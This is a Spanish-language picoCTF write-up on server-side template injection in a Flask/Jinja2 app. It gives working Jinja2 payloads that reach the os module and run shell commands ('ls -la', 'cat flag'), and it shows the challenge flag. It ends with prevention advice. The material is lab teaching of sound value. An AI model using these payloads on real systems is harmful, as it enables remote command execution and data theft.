# Writeup: SSTI1
**Categoría:** Easy
**Fecha de conversión:** 2026-04-24

---

Writeup: SSTI1 (picoCTF) – Solución definitiva

1. Detección de la vulnerabilidad

El sitio web permite introducir texto que se muestra en la página. Probamos con:


```
    {{7*7}} → El servidor devuelve 49. Esto confirma que se está interpretando código de plantilla Jinja2.

```

2. Identificación del entorno

Para confirmar que es Flask con Jinja2, probamos:

jinja2


{{ config }}


El servidor responde con un objeto de configuración de Flask, validando el entorno.

3. Búsqueda de ejecución de comandos

En SSTI con Jinja2, el objetivo es acceder al módulo os para ejecutar comandos. Un método común es recorrer las subclases de object y buscar una que tenga os en __globals__:

jinja2


{% for c in [].__class__.__base__.__subclasses__() %}

```
  {% if c.__init__.__globals__.get('os') %}
    {{ c.__init__.__globals__['os'].popen('ls -la').read() }}
  {% endif %}
```

{% endfor %}


Sin embargo, en este caso el servidor devolvió un error interno (Internal Server Error). Probablemente la salida generada era demasiado grande o el bucle provocó un timeout.

4. Método alternativo con config

El objeto config de Flask está disponible en todas las plantillas y, gracias a la forma en que Flask carga sus dependencias, en __init__.__globals__ se encuentra el módulo os. Este enfoque es más limpio y evita el bucle masivo.


Probamos:

jinja2


{{ config.__class__.__init__.__globals__['os'].popen('ls -la').read() }}


Esta vez el servidor respondió con el listado de archivos del directorio actual:

text


total 12

drwxr-xr-x 1 root root 25 Mar 30 16:20 .

drwxr-xr-x 1 root root 23 Mar 30 16:20 ..

drwxr-xr-x 2 root root 32 Mar 30 16:20 __pycache__

-rwxr-xr-x 1 root root 1241 May 1  2025 app.py

-rw-r--r-- 1 root root   58 Aug 21  2025 flag

-rwxr-xr-x 1 root root  268 May 1  2025 requirements.txt


Allí se encuentra el archivo flag.

5. Lectura de la flag

Sustituimos el comando por cat **flag**:

jinja2


{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}


El servidor devuelve la **flag**:

text


picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}


6. Explicación técnica

```
    config → objeto de configuración de Flask.

    .__class__ → obtiene la clase (flask.config.Config).

    .__init__ → el método inicializador de la clase.

    .__globals__ → diccionario de variables globales del método __init__. En él se encuentra el módulo os porque Flask lo ha importado internamente.

    ['os'] → accede al módulo os.

    .popen('cat flag') → ejecuta el comando y devuelve un objeto tipo archivo.

    .read() → lee la salida del comando y la muestra.

```

7. Por qué falló el bucle

El bucle {% for ... %} recorre cientos de clases y para cada una intenta acceder a c.__init__.__globals__. Si alguna clase no tiene el atributo __init__ (por ejemplo, clases built-in) se puede generar un error. Además, la concatenación de todo el listado puede exceder los límites del servidor (buffer, timeout, etc.). Por eso el método con config es más robusto cuando el objeto config está disponible.

8. Medidas preventivas

```
    No exponer objetos sensibles como config en el contexto de plantillas.

    Utilizar entornos sandbox (Jinja2 SandboxedEnvironment) que restringen el acceso a atributos peligrosos.

    Validar y sanitizar cualquier entrada del usuario que se vaya a incluir en una plantilla.

    Actualizar las librerías para evitar vulnerabilidades conocidas.

```

9. Flag final
text


picoCTF{*****************************}

